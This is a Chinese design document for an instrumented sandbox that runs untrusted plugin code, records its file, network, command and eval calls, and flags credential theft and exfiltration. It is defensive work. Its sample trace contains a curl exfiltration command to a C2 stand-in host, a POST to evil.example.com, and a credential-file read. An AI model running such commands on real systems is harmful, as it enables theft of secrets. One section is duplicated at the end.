# 动态沙箱 MVP 设计（Dynamic Sandbox Design）

> 状态：**MVP 设计 v0.1**（2026-08-16）
> 本文件是动态沙箱模块的**唯一权威设计**。实现偏离必须先改本文件（防漂移）。
> 与 docs/AUTOTRIGGER.md、docs/RULES.md 并列，共同构成 dsh-safety 的设计体系。

---

## 1. 目标（Problem）

静态扫描（正则 + 轻量 AST）只能回答"代码里写了什么"，回答不了"运行时到底会做什么"。
动态沙箱在**受控、受限、可观测**的进程里加载并运行 DSH 插件的 host 端代码，
记录它的真实 API 调用轨迹（读了哪些文件、连了哪些主机、执行了什么命令），
补足静态漏报（远程拉码、延迟触发、环境检测后行为、动态拼接）。

**MVP 范围**：只运行插件 **host 端**（src/index.js / lib/index.js 的 `apply(ctx)`），
不运行 client 端（浏览器代码不在本沙箱能力内）。

## 2. 明确不做（防漂移：MVP 边界）

- ❌ 不真实外发网络数据（网络黑洞：记录主机，不建立真实连接）
- ❌ 不执行 `child_process` 命令（记录命令文本，返回模拟空输出）
- ❌ 不执行 `eval`/`new Function` 载荷（记录参数截断，返回 undefined）
- ❌ 不读写真实文件系统（fs 调用重定向/记录：读返回模拟空，写丢弃并记录）
- ❌ 不运行 client 端（浏览器）代码
- ❌ 不做完整 ctx 模拟（只 mock MVP 需要的表面：on/tool/logger/settings.get/sessions 等）
- ❌ 不声称"能抓到所有恶意"——动态只给**证据轨迹**，结论由人判断

## 3. 安全约束（沙箱自身）

1. 插件代码在**独立子进程**中运行（不是主审计进程），主进程只收轨迹 JSON。
2. 网络黑洞：`fetch`/`http`/`https`/`net`/`WebSocket` 全部被替换——记录目标主机，
   **不建立真实连接**，返回模拟响应（成功假响应或抛"沙箱拒绝"）。
3. 文件隔离：`fs` 的读返回空 Buffer/字符串，写/删/建记录后丢弃——**不触碰真实文件系统**；
   `process.env` 由沙箱注入白名单假值（HOME/USERPROFILE 指向假目录）。
4. 命令不执行、eval 不执行（见"明确不做"）。
5. 超时强杀：整个沙箱进程默认 20s 超时，超时 `process.kill`。
6. 插桩本身只读主进程内存；轨迹 JSON 结构化落盘供报告。

## 4. 架构

```
主进程 (dsh-safety scan/CLI)
  └─ spawn 沙箱子进程（受限 env + 插桩预加载）
       ├─ 插桩层（preload）：patch globalThis.fetch/eval、require 的 fs/child_process/net/http、process.env 访问
       ├─ ctx mock：tool()/on()/logger/settings.get/sessions/config 最小实现
       ├─ 加载插件：require(插件 src/index.js 或 lib/index.js)
       ├─ 调用 apply(ctx)
       ├─ 触发事件：模拟 session/start、session/end 等（让挂在事件回调里的行为代码执行）
       └─ 收集轨迹 → stdout JSON（主进程读取）
```

### 4.1 插桩点（MVP）

| 表面 | 插桩行为 | 记录字段 |
|---|---|---|
| `globalThis.fetch` | 记录 URL/方法/body 大小，返回 `new Response('{}', {status:200})` 模拟 | `{type:'network', method, host, path, bodyBytes}` |
| `node:http`/`https` request | 记录 URL，返回模拟响应（`req.end` 触发回调） | `{type:'network', host, port}` |
| `node:net` connect | 记录 host/port，抛"沙箱拒绝" | `{type:'network', host, port}` |
| `node:child_process` spawn/exec/execFile/execSync | **不执行**，记录命令，exec 回调返回空字符串 | `{type:'command', cmd}` |
| `node:fs` readFile/readFileSync/open/readdir/stat | 读返回空 Buffer/[]，写/append/mkdir/rm/unlink 记录后丢弃 | `{type:'fs-read'\|'fs-write', path, mode}` |
| `globalThis.eval` / `Function` | 记录参数（截断 200 字符），返回 undefined | `{type:'eval', snippet}` |
| `process.env` 访问 | 返回注入的假值；记录访问了哪些 key | `{type:'env', key}` |

### 4.2 ctx mock（最小）

```ts
const ctx = {
  on(event, cb) { handlers[event].push(cb); },
  once/off/emit: 空实现,
  tool(name, schema, fn) { /* 记录注册的工具名 */ },
  logger: { info/warn/error: 记录 },
  settings: { get: (ns) => ({}) , describe: () => [] },
  sessions: { get: () => ({ push(){} }), ... },
  config: { get: () => undefined },
  session: { id: 'sandbox-session' },
  workspace: { get cwd() { return sandboxDir; } },
  // 其余访问返回 undefined（插件容错）
};
```

### 4.3 事件触发

- 注册的事件按常见生命周期触发：`session/start` → `message/create`?（MVP 只触发
  `session/start`、`session/end`、`agent/turn/start` 这类确定性事件，每类一次）。
- 不模拟工具调用（需参数，超出 MVP）。

## 5. 输入 / 输出

### 输入
- `pluginRoot`（本地插件源码目录，已由 prepareSource 解析）
- 可选 `timeoutMs`（默认 20000）

### 输出（轨迹 JSON）
```json
{
  "plugin": "name",
  "status": "completed | timed-out | crashed | load-failed",
  "durationMs": 1234,
  "loadedFile": "src/index.js",
  "eventsTriggered": ["session/start"],
  "traces": [
    { "type": "network", "method": "POST", "host": "evil.example.com", "path": "/upload", "bodyBytes": 512 },
    { "type": "command", "cmd": "curl -d @x http://c2/x" },
    { "type": "fs-read", "path": "C:\\Users\\x\\.dsh\\.credentials.yaml" },
    { "type": "eval", "snippet": "process.env..." },
    { "type": "env", "key": "HOME" }
  ],
  "riskSurfaces": ["network", "fs-read-sensitive", "command"],
  "errors": []
}
```

### 风险面判定（从轨迹）
- `fs-read-sensitive`：读取路径匹配敏感正则（.credentials/.ssh/.npmrc/.env 等）
- `network-exfil`：网络调用 + 存在敏感读取或命令输出
- `command-exec`：任何命令调用
- `eval-exec`：任何 eval/Function

## 6. 与静态的合并

`audit_plugin`（或 CLI `dynamic` 子命令）输出三块：
1. 静态报告（Markdown，现有）
2. 动态轨迹摘要（新）
3. 合并结论：静态嫌疑 + 动态证据交叉（如"静态 T06 + 动态 fs-read-sensitive 命中"）

## 7. 验收标准（MVP）

1. 恶意夹具（exfil：读 .credentials.yaml + fetch）→ 动态轨迹含 `fs-read` 敏感路径 + `network` 目标主机
2. 良性夹具（ok-plugin）→ 轨迹干净（无敏感 fs-read/network/command）
3. 超时强杀生效（含 sleep 的恶意样本 20s 内被杀，status=timed-out）
4. 子进程崩溃不影响主进程（status=crashed 记录）
5. 对真实样本（抽 2 份）运行出轨迹报告

## 8. 不做清单复查（每次实现前对照）

- [ ] 没有真实网络连接
- [ ] 没有真实命令执行
- [ ] 没有真实文件读写（读空写丢）
- [ ] 没有真实 eval
- [ ] 超时必杀

## 9. 依赖加载（已实现，src/dynamic/deps.ts）

npm tarball 无 node_modules → 插件 import 外部依赖失败是主要瓶颈。
方案：动态运行前 `npm install --ignore-scripts`（**不执行任何安装钩子**，与沙箱
"命令不执行"约束一致）。实测：真实插件加载率 1/6 → 3/6（dsh-better-edit、
dsh-speak、dsh-mini-tui 均可 completed）。

### 9.1 ctx mock 迭代（2026-08-16 二轮）

- 补齐 20+ 服务表面（model/agent/approval/storage/terminal/shell/workflows/
  compaction/subagent/attachment/credentials/plugins/heartbeat…）。
- **chainable noop 兜底**：未知 ctx 表面返回可链式调用对象（`ctx.xxx().yyy()` 不崩），
  解决真实插件 apply 阶段崩溃（`ctx.get`、`xxx.register` 等）。
- 实测加载率：**3/6 → 5/6**（dsh-better-edit/dsh-cost-log/dsh-speak/dsh-ergonomics/
  dsh-plug-manager completed；dsh-mini-tui 偶发 crashed——TUI 插件在权限模型下
  的 TTY 相关，MVP 可接受）。

## 10. 隔离方案：本地方案为主，Docker 可选（2026-08-16 决策）

**结论：动态沙箱不依赖 Docker**——本地方案（Node 权限模型 + 插桩）已覆盖核心隔离：

| 隔离点 | 本地方案 | 状态 |
| --- | --- | --- |
| 网络 | `--permission` 不授权 net → fetch/http 被内核拒 + fetch patch | ✅ 实证（exfil 网络被拦） |
| 文件系统 | `--allow-fs-read/write` 白名单 + HOME 重定向 | ✅ 实证（exfil 读真文件失败） |
| 子进程 | 权限模型禁 child_process | ✅ |
| 资源限制 | `--max-old-space-size=256` + 超时强杀 | ✅ 实证（内存炸弹 294ms OOM 崩溃，宿主无影响） |
| eval/Function | patch 记录不执行 | ✅ |

`Dockerfile` + `src/dynamic/docker.ts` **保留为可选增强**（内核级资源上限更严格），
但**非必需**。Docker daemon 当前不可用不影响沙箱使用；`runDynamicDocker` 探测到
daemon 不可用会明确提示，不静默降级。

## 11. 二轮打磨：fs/cp 真插桩 + 时间加速 + 工具模拟（2026-08-16）

MVP 的"错误即证据"（权限模型拒绝错误提取路径）粒度粗：fs 拒绝不带路径、延迟触发
行为在观察窗口内必然漏。二轮升级（实测驱动）：

### 11.1 fs / child_process 真插桩（精确路径/命令记录）

关键发现：**patch `require('node:fs')` 模块对象后，插件 ESM `import { readFileSync }`
同样看到新函数**（ESM 命名导入共享 CJS 模块对象）。于是从"错误即证据"升级为真插桩：

| API | 行为 | 轨迹 |
|---|---|---|
| readFile/readFileSync/createReadStream | **路径敏感**：插件根内（ESM loader 读源码/入口探测）走真实；根外记录+返回空 Buffer | `{type:'fs-read', path}` |
| writeFile/appendFile/mkdir/rm/unlink/copyFile | 记录+丢弃（不触碰真实文件系统） | `{type:'fs-write', path, op}` |
| readdir/stat/existsSync | 记录路径（信息性） | `{type:'fs-read', path, op}` |
| exec/execSync/execFile/spawn/spawnSync | 记录命令，返回模拟空输出（不执行） | `{type:'command', cmd}` |

**路径敏感的关键**：不能全量 patch readFile——ESM loader 也用 fs 读插件源码，
全量 patch 会把插件模块读成空导致 load-failed。白名单判定用 `isInsidePluginRoot`。

### 11.2 时间加速（timer 插桩）

setTimeout/setInterval/setImmediate **立即执行回调**（记录原始延迟），沙箱内不真实等待。
动机：延迟触发型恶意行为（setTimeout 5s 后读凭据）在观察窗口内必然漏——加速后立即暴露，
危险动作仍被 fs/net/cp 拦截，只是时机提前。
新风险面：`deferred-trigger`（timer + 敏感行为组合 = 反静态检测手法）。
实测：delayed-exfil（5s 延迟）从"完全漏报"→ `fs-read-sensitive,network,network-exfil-risk,deferred-trigger` 全抓到。

### 11.3 工具调用模拟

ctx.tool 支持三种形态（直接 handler / 链式 register / 无参 tool().register(name,fn)），
apply 后**逐个调用已注册工具 handler**（mock 参数）——夹带行为常藏在工具体里。
新轨迹：`{type:'tool', name}`。

### 11.4 事件扩展 + unhandledRejection 容忍

- 事件 3 → 5 个：session/start、agent/turn/start、message/create、agent/tool/call、session/end
- 观察窗口 800ms → 2000ms（timer 加速后主要等微任务/IO 回调）
- `process.on('unhandledRejection')`：插件代码忘 await 的 async 调用（如
  `const code = fetch_rat()`）默认崩沙箱——捕获为错误轨迹，不影响观察其余行为

### 11.5 二轮实测结果（15 样本全跑）

| 样本 | 动态结果 |
| --- | --- |
| delayed-exfil | fs-read-sensitive + network + network-exfil-risk + **deferred-trigger** ✅ |
| credential-dumper | fs-read-sensitive + network + network-exfil-risk ✅ |
| api-key-sniffer | fs-read-sensitive + network + network-exfil-risk ✅ |
| session-thief | fs-read-sensitive（会话目录）✅ |
| persistence-rat | command + eval + network（unhandledRejection 容忍）✅ |
| obfuscated-loader | eval ✅ |
| exfil（旧夹具） | fs-read-sensitive + network + command ✅ |
| ok-plugin / vision-helper | 干净 / network（能力面）✅ |

测试 8 项动态断言全绿（全量 35/35）。

**结论：动态沙箱不依赖 Docker**——本地方案（Node 权限模型 + 插桩）已覆盖核心隔离：

| 隔离点 | 本地方案 | 状态 |
| --- | --- | --- |
| 网络 | `--permission` 不授权 net → fetch/http 被内核拒 + fetch patch | ✅ 实证（exfil 网络被拦） |
| 文件系统 | `--allow-fs-read/write` 白名单 + HOME 重定向 | ✅ 实证（exfil 读真文件失败） |
| 子进程 | 权限模型禁 child_process | ✅ |
| 资源限制 | `--max-old-space-size=256` + 超时强杀 | ✅ 实证（内存炸弹 294ms OOM 崩溃，宿主无影响） |
| eval/Function | patch 记录不执行 | ✅ |

`Dockerfile` + `src/dynamic/docker.ts` **保留为可选增强**（内核级资源上限更严格），
但**非必需**。Docker daemon 当前不可用不影响沙箱使用；`runDynamicDocker` 探测到
daemon 不可用会明确提示，不静默降级。
